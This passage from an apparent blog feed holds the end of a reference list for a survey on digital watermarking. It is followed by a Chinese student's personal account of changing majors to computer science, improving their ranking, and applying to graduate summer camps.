Thirty-Fifth Conference on Innovative Applications of Artificial Intelligence and Thirteenth Symposium on Educational Advances in Artificial Intelligence (AAAI’23&#x2F;IAAI’23&#x2F;EAAI’23), Vol. 37. AAAI Press, Article 564, 5054–5061.</li><li>Ma R, Guo M, Hou Y, et al. Towards Blind Watermarking: Combining Invertible and Non-invertible Mechanisms[C]&#x2F;&#x2F;Proceedings of the 30th ACM International Conference on Multimedia. 2022: 1532-1542.</li><li>Jia Z, Fang H, Zhang W. Mbrs: Enhancing robustness of dnn-based watermarking by mini-batch of real and simulated jpeg compression[C]&#x2F;&#x2F;Proceedings of the 29th ACM international conference on multimedia. 2021: 41-49.</li><li>Wen Y, Kirchenbauer J, Geiping J, et al. Tree-Ring Watermarks: Fingerprints for Diffusion Images that are Invisible and Robust[J]. arXiv preprint arXiv:2305.20030, 2023.</li><li>Fernandez P, Couairon G, Jégou H, et al. The stable signature: Rooting watermarks in latent diffusion models[J]. arXiv preprint arXiv:2303.15435, 2023.</li><li>杨义先 ,钮心忻 ,任金强. 信息安全新技术[M]. 北京:北京邮电大学出版社 ,2002. 56259.</li><li>Cox I J, Mill M L, Bloom J A. Digital Watermarking* *[M]. San Francisco: Morgan Kaufmann Publishers, 2001. 2412316.</li><li>Cox I J, Kilian J, Leighton T, et al. Secure spread spectrum watermarking for multimedia [J]. IEEE Trans on Image Processing* *,1997 ,6 (12) :1673-1687.</li><li>Cox I J, Linnartz J M G. Some general methods for tampering with watermarks [J]. IEEE J on Selected A reas in Com m unications ,1998 ,16 (4) :5872593.</li><li>Boeuf J, Stern J P. An analysis of one of the SDMI candidates[A]. Proc of the Fourth Int Workshop on Inf ormation Hiding[C]. Berlin: Springer ,2001. 3682374.</li><li>Voloshynovskiy S, Pereira S, Pun T, et al. Attacks on digital watermarks: Classification, estimation2based attacks and benchmarks[J]. IEEE Communications Magazine, 2001, 39(8) :1182125.</li><li>Kalker T, Linnartz J P, Dijk M V. Watermark estimation through detector analysis[A]. IEEE Int Conf on Image Processing[C]. Los Alamitos ,1998. 4252429.</li><li>Petitcolas F A P, Anderson R, Kuhn M G. Information hiding: A survey[J]. Proc of the IEEE, 1999, 87(7): 106221078.</li><li>Kutter M, Voloshynovskiy S, Herrigel A. The watermark copy attack[A]. Proc of the SPIE[C]. San Jose, 2000. 3712380.</li><li>Craver S, Memon N, Yeo B L, et al. Resolving rightful ownerships with invisible watermarking techniques: Limitations, attacks and implications[J]. IEEE J on Selected Areas in Communications, 1998 ,16 (4) :5732586.</li><li>汝学民. 音频隐写与分析技术研究[D]. 杭州: 浙江大学, 2006.</li><li>张歆昱. 基与心理声学模型的音频数据算法研究[D]. 武汉：华中科技大学，2004.</li><li>Nedeljko Cvejic, Tapio Seppanen. Increasing the capacity of LSB-based audio steganography[C]. In: Proceedings of 2002 IEEE Workshop on Multimedia Signal Processing, St Thomas, Virgin Islands, USA, 2002; Virgin Island: IEEE, 2002: 336-338.</li><li>卢欣, 叶成荫, 吴旭翔. 一种基于能量特征的LSB方法设计[J]. 商场 现代化, 2007, (11):44-45.</li><li>陈燕辉. 数字水印系统和能量自适应LSB语音数字水印研究[D]. 杭州: 浙江大学, 2003.</li><li>侯剑, 付永生, 郭恺. 基于相位调制的立体声音频数字水印[J]. 电子技术应用, 2006, (6):49-51.</li><li>王向阳, 付斌. 基于内容的自适应量化数字音频盲水印算法[J]. 辽宁师范大学学报(自然科学版), 2006,29(1)：37-42.</li><li>Jiren Zhu, Russell Kaplan, Justin Johnson, and Li Fei-Fei. 2018. HiDDeN: Hiding Data With Deep Networks. In Computer Vision – ECCV 2018: 15th European Conference, Munich, Germany, September 8-14, 2018, Proceedings, Part XV. Springer-Verlag, Berlin, Heidelberg, 682–697.</li><li>PAVLOVIĆ K, KOVAČEVIĆ S, DJUROVIĆ I, et al. Robust speech watermarking by a jointly trained embedder and detector using a DNN[J&#x2F;OL]. Digital Signal Processing, 2022: 103381.</li><li>Liu, Chang &amp; Zhang, Jie &amp; Fang, Han &amp; Ma, Zehua &amp; Zhang, Weiming &amp; Yu, Nenghai. (2023). DeAR: A Deep-Learning-Based Audio Re-recording Resilient Watermarking. Proceedings of the AAAI Conference on Artificial Intelligence[C]. 37. 13201-13209. 10.1609&#x2F;aaai.v37i11.26550.</li><li>WavMark: Watermarking for Audio Generation[J]. 2023.</li><li>CRAVER S, MEMON N, YEO B L. Resolving rightful ownerships with invisible watermarking techniques: limitations, attacks and implications[J]. IEEE Journal on Selected Areas in Communications, 1998, 16(4): 573-586.</li><li>STEINEBACH M, PETITCOLAS F A P, RAYNAL F. StirMark benchmark: audio watermarking attacks[A]. Proceedings of the International Conference on Information Technology: Coding and Computing[C]. 2001. 49-54.</li><li>KIROVSKI D, MALVAR H S. Spread spectrum watermarking of audio signals[J]. IEEE Transactions on Signal Processing, 2003, 51(4):1020-1033.</li><li>HARTUNG F，GIROD B． Digital Watermarking of Raw and Compressed Video[C] &#x2F;&#x2F;Proceedings of SPIE-The International Society for Optical Engineering. 1997,205-213．</li><li>HARTUNG F，GIROD B． Watermarking of Uncompressed and Compressed Video[J]. Signal Processing, 1998, 66(3): 283-301.</li><li>LANCINI R, MAPELLI F, TUBARO S. A Robust Video Watermarking Technique in the Spatial Domain[C]&#x2F;&#x2F;Zadar: International Symposium on VIPromCom Video&#x2F;Image Processing and Multimedia Communications, 2002. 251-256.</li><li>TOKAR T, KANOCZ T, LEVICKY D. Digital Watermarking of Uncompressed Video in Spatial Domain[C]&#x2F;&#x2F; Bratislava: 2009 19th International Conference Radioelektronika，2009. 319-322．</li><li>ZHU WW, XIONG Z X, ZHANG Y Q. Multiresolution Watermarking for Images and Video[J].IEEE Transactions on Circuits and Systems for Video Technology, 1999, 9(4): 545-550.</li><li>SONG X G, SU Y T, LIU Y, et al. A Video Watermarking Scheme for AVS Based on Motion Vectors[C]&#x2F;&#x2F;Beijing： Proceedings of 2008 11th IEEE International Conference on Communication Technology, 2008. 767-770．</li><li>QIU G, MARZILIANO P, HO A T S, et al. A Hybrid Watermarking Scheme for H. 264&#x2F;AVC video[C]&#x2F;&#x2F; Cambridge: Proceedings of the 17th International Conference on Pattern Recognition, 2004. 865-868.</li><li>ZHANG J HO A, QIU G, et al. RobustVideo Watermarking of H. 264&#x2F;AVC[J]. IEEE Transactions on Circuits and Systems II: Express Briefs, 2007, 54(2): 205-209.</li><li>Hartung F H, Su J K, Girod B∙Spread spectrum watermarking: Malicious attacks and counterattacks[A]. In: Proceedings of SPIE Security and Watermarking of Multimedia Contents, San Jose, 1999. 147-158.</li><li>Voloshynovskiy S, Pereira S, Thierry P, et al. Attacks on digital watermarks: Classification estimation based attacks and benchmarks[J]. IEEE Communications Magazine. 2001, 39(8): 118-126.</li></ol>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的保研之路</title>
      <link href="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/"/>
      <url>/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>2024年9月25日，我收到了北大的拟录取通知，当时感觉一切都释然了，仿佛做梦一般，怎么也想不到会是这个结果。接下来就看看这一路走来的颠沛流离吧，以此送给我过去付出的点点滴滴。</p><h1 id="1-大一机械转专业"><a href="#1-大一机械转专业" class="headerlink" title="1 大一机械转专业"></a>1 大一机械转专业</h1><h2 id="1-1-报志愿"><a href="#1-1-报志愿" class="headerlink" title="1.1 报志愿"></a>1.1 报志愿</h2><p>刚上大一的时候还是机械专业，我高考分数是597分，从下面可以看到东秦在我们省机械类专业的最低分数线是596，可以说几乎是压线进来的。当时报考东秦的时候完全是从我报了一个报考辅导机构，然后机构中有一个系统，你输入选课、高考分数和位次之后会自动筛选出一些学校，东秦也就是筛选出来的。我自己在报考之前完全不知道有这个学校。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_N-qYNsYJ9R.png"></p><p>就是这样，我就在96个志愿中的好像是第11个志愿填上了东北大学秦皇岛分校—机械类专业。记得当时出录取结果的时候，我和父亲在超市里买东西，知道结果后，好像挺开心的当时，一方面是有大学上了，其次是个985（虽然是末9）。</p><h2 id="1-2-大一上学期的懵懂"><a href="#1-2-大一上学期的懵懂" class="headerlink" title="1.2 大一上学期的懵懂"></a>1.2 大一上学期的懵懂</h2><p>在上大学之前，我就和母亲了解过东秦可以转专业，但是当时也仅仅是了解，而且知道转专业都是学习好的转，不是随便转的。</p><p>开学之后，对我的大学生活和大学规划一无所知，其实也不知道自己以后要干什么，要不要转专业，要不要考研。现在想来这也是正常的，因为大部分大一新生还是沉浸在刚脱离高中享受自由的喜悦吧。由于高中还是挺认真的在学习，所以刚上大一的时候还是延续了这种劲头，上课的时候也会认真听，认真完成作业。</p><p>但是记得刚开始，上完课就回宿舍，完全没有说会想着自己再去多学点东西。还记得当时很想谈恋爱，对恋爱很憧憬，还和一个女生约了一起去学习，但是现在想来真是尴尬至极（不懂事哈哈哈🤣）。</p><h3 id="1-2-1-机器人实验室校内赛"><a href="#1-2-1-机器人实验室校内赛" class="headerlink" title="1.2.1 机器人实验室校内赛"></a>1.2.1 机器人实验室校内赛</h3><p>在确定录取结果之后开学之前，控院一个机器人实验室开始招新，其中就有机械组，然后正好是我学的专业，所以就很积极，很想学习机械的一些内容，特别是其中涉及到使用solidworks进行一些3D建模，就很感兴趣，像下面这种。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_RSjgC9irVb.png"></p><p>solidworks这个软件特别大，而且是国外公司开发的，正版软件购买的话好像好几万块钱，所以都是盗版软件，需要激活注册，总之这个软件安装特别费劲的。安装好之后，就开始照着图纸进行建模，当时感觉非常好玩，毕竟3D建模好像对于大部分男生来说都有吸引力。</p><p>开学之后这个实验室要进行选拔，有一个校内比赛，所以大一上很多时间都在弄这个校内赛。这个比赛需要组队，一共4个人，我当时和我们专业另一个男生，然后又找了两个大二的学长一起组了队。在备赛的过程中，队伍的学长们都很耐心，没有说我们是大一的然后觉得我们菜（不过当时确实有点菜感觉）。此外，我们有什么不懂的问题问实验室的学长的时候也都很好。</p><p>最后在校内赛中，我们获得了第一名，好像有十多只队伍参赛。我当时还发了个说说，现在感觉当时还真是活跃啊哈哈哈，那时候的我还经常发空间的。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_CFl_sQBvAT.png"></p><p>我当时比赛操作的视频被我队友录下来了，在B站上传了，如下：</p><iframe     width="800"     height="450"     src="//player.bilibili.com/player.html?isOutside=true&aid=422451476&bvid=BV143411x7C3&cid=464438280&p=1"     frameborder="no"     allowfullscreen="true"></iframe><p>现在想来真是意难平，但是特别多人都在围观，我还是操作手，不过总之还是扛住了压力，哎，真是感慨万分。</p><h3 id="1-2-2-参加各种活动"><a href="#1-2-2-参加各种活动" class="headerlink" title="1.2.2 参加各种活动"></a>1.2.2 参加各种活动</h3><p>除了上面的比赛之外，我也参加了特别多的部门招新面试和开放活动，其中就包括我和女朋友相遇的那个部门。但是让我记忆尤新的是参加南校一个科创开放日，你能去各个团队进行参观。我在参观一个实验室的时候，其中一个学姐问我是什么专业的（因为不止我们专业的可以去），我说机械，然后她说她也是机械专业，当时感觉很亲切。</p><p>了解了之后，她是机械转到计工电子信息的，然后她问我想转专业吗？我说我不知道，听说转专业挺难的。然后她告诉我说，转专业其实不难，大一就认真学习的不多，只要你努力学，肯定可以。其实当时对她说的没有什么感觉，之后她告诉我说机械就业薪资可能比较少之类的，当时其实我没有多动摇，还是想着继续学机械。</p><p>但是之后，我上面参加校内赛的那个实验室其中一个大三的学长也给我说了类似的话，表达的意思就是如果有机会可以转专业的话还是转出去吧，好像机械专业前十能转的都转了。那时我就有些动摇了，想着是不是可以考虑转专业。</p><p>之后大一上学期就结束了，我的成绩排名是第11，高数考的太低了，这个排名应该处于转专业的边缘。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_bzjc8Y4_tJ.png"></p><h2 id="1-3-大一下学期的拼搏"><a href="#1-3-大一下学期的拼搏" class="headerlink" title="1.3 大一下学期的拼搏"></a>1.3 大一下学期的拼搏</h2><p>大一下学期由于疫情，没有开学，从寒假开始，整个开学都是在家里线上教学。很感谢这个学期的自己，真的每个课都认真听，认真完成老师布置的作业，认真做好复习。其实在这个学期自己也经历了一些心理上的历程，当时想转专业的决心达到了极致。</p><p>这个学期有C语言教学，然后感觉对计算机很感兴趣，而且计算机的薪资高。所以当时特别特别特别想转专业，但是自己处于边缘，所以只能好好学，好好学，好好学，太不容易了。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_IUXC8aYxpj.png"></p><p>最后我的成绩来到了专业第5，转专业已经很稳啦。当时父母也都很开心，能换到一个更好的专业，接下来就是选择转到哪个专业，肯定想去计算机。但是所有转专业的学生有一个C语言的机试，并且当时很多人都想转到计算机专业，所以还是有些担心自己能不能成功转入CS。</p><p>最后还是有惊无险吧，成功转入自己想学的专业，当时特别开心吧，通过自己的努力换了一个专业。</p><hr><h1 id="2-大二计算机"><a href="#2-大二计算机" class="headerlink" title="2 大二计算机"></a>2 大二计算机</h1><p>刚转到计算机的时候，感觉自己太菜了，别人都学了一年了，你这个外来的就会个C语言，而且当时还要补修大一没学的计算机课程。刚转过来之后我的绩点排第13，然后好像那年计科保研的就13或14个人。当时在想，估计保研的希望不大了，因为如果不转专业的话在机械肯定能保研，现在都不一定了。当时其实有做考研的打算。</p><h2 id="2-1-实验室考核"><a href="#2-1-实验室考核" class="headerlink" title="2.1 实验室考核"></a>2.1 实验室考核</h2><p>刚转过来之后，有计工学院的实验室招新，其中介绍的是研究程序下棋，感觉很有意思，就填了报名表，我还留着，如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_LMqypnodRF.png"></p><p>现在回看这个报名真是感慨万分，内心五味杂真，之后也就收到了面试通知。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_i9s71olq8k.png"></p><p>当时去面试的时候，看到有很多人也在等待进行面试，反正感觉其他人都好强，自己好菜….面试的过程过去好长时间了，我也忘记了，总之当时也问了一些技术问题，感觉回答的好像还行？自己也不知道什么样，其实就抱着试一试的态度。最后，很幸运的收到了以下通知：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_FOMWlZiJ_f.png"></p><p>之后就去实验室啦，但是去了发现好像还有一轮考核，给每个人分配一个工位之后，需要在1个月内完成蒙特卡洛树搜索算法的复现，时间太久远了，相关的内容找不到了，那段时间也不会python，所以就从python学起，那段时间也挺拼的吧，仅用2个月就完成了考核任务，而且实验室学长对我也都很认可。</p><h2 id="2-2-谈恋爱"><a href="#2-2-谈恋爱" class="headerlink" title="2.2 谈恋爱"></a>2.2 谈恋爱</h2><p>谈恋爱其实大一就想谈了，也进行了一些尝试，但是都是后续由于各种各样的原因没有结果了。然后大一下又没有开学，自己也不想网恋，感觉不真实，就没有想这件事。</p><p>大二上正好我有一个部门工作，然后那个部门里有来自各个学院的同学，所以能认识到很多人。一开始和一个女生互有好感，但是在互相了解的过程中，发现彼此性格还是不太合适，最后也以失败告终。当时刚结束的时候，还想着自己不想主动找其他女生了，因为刚转专业，也有很多课程要学习。</p><p>之后，stella，也就是我现在的女朋友，她主动加了我的好友，我当时就在想这个女生是不是对我有意思，但是经历了前面的失败，有点不太敢尝试了。之后好像是她约我出来打羽毛球🏸，我当时想的是不能辜负女生的好意，于是就想和stella了解一下，看看是不是自己的理想型。在这个过程中，大概了解了快一个月吧，说实话，感觉学习都落下了好多哈哈哈，心思全在她身上了，每天都想她。</p><p>中间也发生过一些小插曲，不过最终在一天（我们每次晚上一起自习完之后，都会去西操场去散步），其实那天我挺紧张的，因为我想和她表白，哈哈哈哈。现在想来真是有些羞涩，我真的鼓起了勇气向她说“你愿意做我的女朋友吗”，她说她愿意啊。当时的那种开心和幸福，现在还能感觉的到。梦想成真的感觉，从小到大虽然也和一些女生暧昧过，但是几乎都是偷偷摸摸的，怕被老师和父母发现，就很难受，但是和stella是自由的，不怕被任何人发现。</p><p>确认关系的那天晚上，我第一次和她牵了手，当时感觉太羞涩了，毕竟没有经历过，感觉一切都是那么的新奇。然后回宿舍之后，就绑定了QQ的情侣关系，换了情侣头像，stella愿意和我换名侦探柯南的情头（我是一个柯南迷），当时特别开心，现在想来都很开心，可能这种开心只会在当时才能产生吧。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/WPS%E6%8B%BC%E5%9B%BE0_mxQ8TOi17t.png"></p><p>之后就沉浸在男女朋友刚确认关系的新鲜感中，其实当时我们还是有很多需要磨合的地方，这也体现在我们后面出现了大大小小的各种矛盾，不过还好，我们深爱对方最后走到了现在，从2022-11-09确认关系到现在，已经快2年了，这2年经历了很多。不过我们都在因为对方的存在变得越来越好，希望我们可以一直幸福下去~</p><h2 id="2-3-成绩"><a href="#2-3-成绩" class="headerlink" title="2.3 成绩"></a>2.3 成绩</h2><p>就像上面说得，大二上学期几乎都在谈恋爱了，然后快期末考试的时候，疫情又爆发了（当时还没解封），所以期末考试就取消了，改为下个学期开学的时候进行。我也就因祸得福，因为当时很多都没学完。然后寒假的时候我就努力复习，好像大二上学期的成绩进步到了11名。</p><p>然后大二下学期的成绩进步到了第8名，因为下学期没有什么负担和压力让我分心了，就在好好学习，就这样，我挤进了前十。</p><hr><h1 id="3-大三保研"><a href="#3-大三保研" class="headerlink" title="3 大三保研"></a>3 大三保研</h1><h2 id="3-1-大三上写论文"><a href="#3-1-大三上写论文" class="headerlink" title="3.1 大三上写论文"></a>3.1 大三上写论文</h2><p>在大二结束的那个暑假，我没有回家，留在学校参加2023年的计算机博弈比赛，整个暑假也很忙碌。不过那好像是我第一次认真的在写代码和开放文档，所以那段时间现在回想起来也很开心。</p><p>之后就是大三上学期开学，由于保研是大四上学期，所以如果要有论文加分的话，必须大三上学期就要写完进行投稿吧。同时大三上学期也开了计组、计网、操作系统和编译原理等很多重要的专业课，所以一整个学期都是很累，特别是最后期末周的时候，几乎每周一个考试，还有好几个课设，现在回想起来还是感觉很累的。</p><p>关于写论文详见<a href="https://zhouzimu.top/2024/01/28/%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E8%AE%BA%E6%96%87%E5%A4%84%E5%A5%B3%E4%BD%9C/" title="记录我的第一篇论文">记录我的第一篇论文</a>，最后这篇论文也是成功投稿并录用了。在大三上学期的期末考试中，我几乎每科都考得很好，成绩如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_zTLL-sS-P-.png"></p><p>这也导致我的成绩一下子从第8名进步到第6名，真是不容易，要知道，名次越靠前，肯定进步越难，因为大家都是努力学习的，所以我也很佩服自己做到了。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_3BKiC1YcR5.png"></p><h2 id="3-2-大三下开始保研"><a href="#3-2-大三下开始保研" class="headerlink" title="3.2 大三下开始保研"></a>3.2 大三下开始保研</h2><p>在大三上结束的寒假，其实就已经开始着手准备一些保研相关的事情，包括准备个人陈述、简历等内容。那时候也开始了解可以报名什么学校、什么专业之类的事情。</p><p>然后就是下学期开学了，虽然这学期的课程没有什么很重要的，但还是有很多课，而且还是要好好学的吧，因为保研算成绩的时候会用到前六学期的成绩，所以这个学期一边要准备保研的机试、专业课和面试等内容，同时还要认真准备校内的考试。</p><p>具体保研的内容下面再介绍，大三下学期的最终成绩如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_7u2L3WIZTg.png"></p><p>我的排名竟然又进步了，这次我真的没有想到，因为当时第6名我觉得已经很好了，毕竟刚转来的时候才刚排13名，现在已经进步了很多了。这次成绩出来之后，一下子从第6名前进到第4名，不用描述，当时感觉非常开心，因为这样的话保研更稳了，并且报名学校预推免的时候rank更高了。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_PVIphSktqq.png"></p><h2 id="3-3-保研综测"><a href="#3-3-保研综测" class="headerlink" title="3.3 保研综测"></a>3.3 保研综测</h2><p>最后保研的时候要计算综测，综测的计算方法如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_5Qxeg7pxc2.png"></p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_GYSHDAtXQc.png"></p><p>其中$M1&#x3D;0.4,M2&#x3D;0.3,M3&#x3D;0.3$。</p><p>我的加权平均学分绩是93.188，排名第4，然后论文的话我有一篇北大中文核心论文学生一作，可以加20分。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_MeWBGZFAQr.png"></p><p>比赛的话我有一个五星国一，成员排序也是第一，能加15分。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_JXwrgvOWB_.png"></p><p>然后剩下的就是奖学金部分，虽然这部分我可能不是很高的，但是也不至于被别人拉开差距，所以当时在出综测成绩之前，我就想着自己肯定会前进几名，或许到第2、第3名，最后的结果是我真的意想不到的，结果如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_uMyyTbXhH4.png"></p><p>我是第一！！！天呢，谁会知道是这个结果呢？当时感觉很不容易，应该是太不容易了，刚转专业过来才刚13名，还担心自己能不能成功保研，最后我竟然成为综测第一名，很开心，因为我知道很多学校在预推免的时候会让填综测排名，所以第一的话还是为我保去好学校增加了一丝可能性。</p><hr><h1 id="4-夏令营"><a href="#4-夏令营" class="headerlink" title="4 夏令营"></a>4 夏令营</h1><p>刚开始投递的时候也不知道自己能去什么学校，只是知道要多投一些。去年我们专业学长学姐保研去的学校中（不考虑专业和导师）最好的是浙江大学，所以当时自己也想试一试华五，其中最想去上交吧。所以在2024-03-31我给上交的老师发了第一封套磁信：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_Tg44RA5Wch.png"></p><p>很遗憾的是没有收到老师的回信，当时感觉很失望，怀疑自己是不是水平太低了，现在感觉老师不回真是太正常了。</p><p>一个星期后老师还没有回复，于是我又想上交的另一个老师发了套磁信，令人难忘的是，老师竟然回复了，内容如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_ZX3M9OcFzC.png"></p><p>之后我把论文发给老师之后，不知道是不是因为方向不匹配的问题还是其他，老师就没有回复我。过了很久我又给老师发了一封邮件咨询老师，老师回复我说他没有硕士名额，只有博士名额了。</p><p>就这样，我的保研之路就此踏上了征程。夏令营一共投递了33个项目，一共只有6个通过初筛，18%的通过率，真让人头疼🤦‍，不知道是不是rank不够，还是其他原因。接下来分别介绍几个参营的学校经历。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/QQ%E6%88%AA%E5%9B%BE20240926195405_asBWZiKpjD.png"></p><h2 id="4-1-天大智算"><a href="#4-1-天大智算" class="headerlink" title="4.1 天大智算"></a>4.1 天大智算</h2><p>第一个入营的项目就是天大，天大在入营之前有一个线上机试，一共5道题，之后根据这次机试来刷掉大部分人。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_27mUXNrTss.png"></p><p>很幸运我成功通过了初筛，机试题目见<a href="https://zhouzimu.top/2024/06/23/6.23%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%88%9D%E7%AD%9B%E6%9C%BA%E8%AF%95/" title="6.23天津大学夏令营初筛机试">6.23天津大学夏令营初筛机试</a>，入营通知如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_OFGEhpoiU0.png"></p><p>别提当时有多开心了吧，因为好多项目都被拒绝了，怕自己一个都入不了，最后收到了天大的入营通知，还是很开心的。之后就是参营过程，详见<a href="https://zhouzimu.top/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/" title="天津大学智算夏令营之旅">天津大学智算夏令营之旅</a>。</p><p>出优秀营员结果的时候，大部分人都被评为了优秀营员，但是只有这个优秀营员是没用的，还需要找一个团队进行上报，这样才能被A+优秀营员，相当于必须得有团队接收你。所以，我就找了一个团队进行考核，考核内容见<a href="https://github.com/NoyeArk/2024X-TeamSummarCamp" title="2024 X-Team夏令营考核">2024 X-Team夏令营考核</a>。那段时间正好也回家了，所以也没有什么事情，几乎都在搞这个，应该就算是在做科研吧，感觉挺有意思的，成功通过了团队的考核。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_omxP5rWvUX.png"></p><p>当时由于只有这一个offer，所以也说会去，就这样，天大和我的故事就告一段落了。</p><h2 id="4-2-电科面试"><a href="#4-2-电科面试" class="headerlink" title="4.2 电科面试"></a>4.2 电科面试</h2><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_8STJNHRVca.png"></p><p>电科当时也入营了，由于7.1~7.3我在参加天大的夏令营，但是电科的安排是7.3~7.4，所以电科7.3的团队宣讲我就没参加，然后7.3晚上直接坐飞机从天津赶到成都。</p><p>这也是我第一次坐飞机，飞机起飞的时候感觉挺震惊的，而且飞机在飞行的过程中还遇到了气流，一直在乱晃。对于没坐过飞机的我来说，当时心跳很快，特别害怕出事故，但是空姐说这属于正常情况，等一会飞到气流稳定的地方就好了，不过当时还是很担心的。</p><p>记得到酒店的时候都7.4凌晨了，然后9点还要面试，面试的流程如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_ITqgm5q33A.png"></p><p>当时英语问题让我回答我的优点和缺点是什么？哎，当时的我是一点没有准备啊，所以就在瞎掰英语口语，还挺紧张。专业课是自己抽题，我当时的运气真是绝了，直接抽到软件工程，这个真是一点不会。学校上课的时候就一次课没听过，虽然最终的成绩很好，但是只要你认真背老师给的知识点，肯定至少90分以上。所以当时抽到软工相关的题目的时候，内心还是挺慌的，自己回答的时候也是有有点没有逻辑。</p><p>电科清水河校园的风景还是挺美的，绿意盎然，但是我面试完就直接回酒店了，因为当时感觉又累又困，之后第二天就坐车回家了。其实也可以在成都玩一玩的，感觉成都好玩的好吃的地方有很多，希望以后有机会去成都旅游。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_kUm3HTA6Rp.png"></p><p>果不其然，没有被评选上优秀营员，但是正是这次的失利，让我知道自己什么地方是薄弱的，回家之后我就认真准备英语口语和专业课了。</p><h2 id="4-3-北工大面试"><a href="#4-3-北工大面试" class="headerlink" title="4.3 北工大面试"></a>4.3 北工大面试</h2><p>北工大好像都不是985，为什么报名这个学校呢？是因为自己夏令营的时候确实没有入什么营，这时候也没有天大和西交的offer，所以怕自己没学上，就报了北工大，考虑到在北京，所以想着实在不行就去这里吧，起码实习挺方便的。</p><p>但是发生了一个小插曲——我在报名系统中的身份证号填错了，后续面试的时候是通过学信网发布的，由于我的身份证填错，导致一直没有收到面试，后来找相关老师进行解决。最后发现是我的身份证填错了….向北工大老师说声抱歉，那个老师也说了我一顿，我也向她道歉了。</p><p>由于这次事故，我之后填系统都仔细检查自己的信息，千万不能再犯这种错误。最后北工大也获得优营，但是后面有了其他offer，这个优营也没管了。</p><h2 id="4-4-西交计算机"><a href="#4-4-西交计算机" class="headerlink" title="4.4 西交计算机"></a>4.4 西交计算机</h2><p>西交计院计算机入营是在天大之前，由于夏令营是线上进行，并且不发offer，是团队进行考核，所以估计认真做的人很少。我也是做完了天大的团队考核之后，才开始做的西交的考核。</p><p>具体考核任务见<a href="https://github.com/NoyeArk/StableDiffusion-LayoutGuidance" title="将LayoutGuidance应用到StableDiffusion">将LayoutGuidance应用到StableDiffusion</a>，这个任务涉及到文生图相关，之前从来没接触过相关的知识，但是一直想弄明白文生图的原理，所以感觉很有意思，最后也成功通过了考核，通知如下：</p><p><img 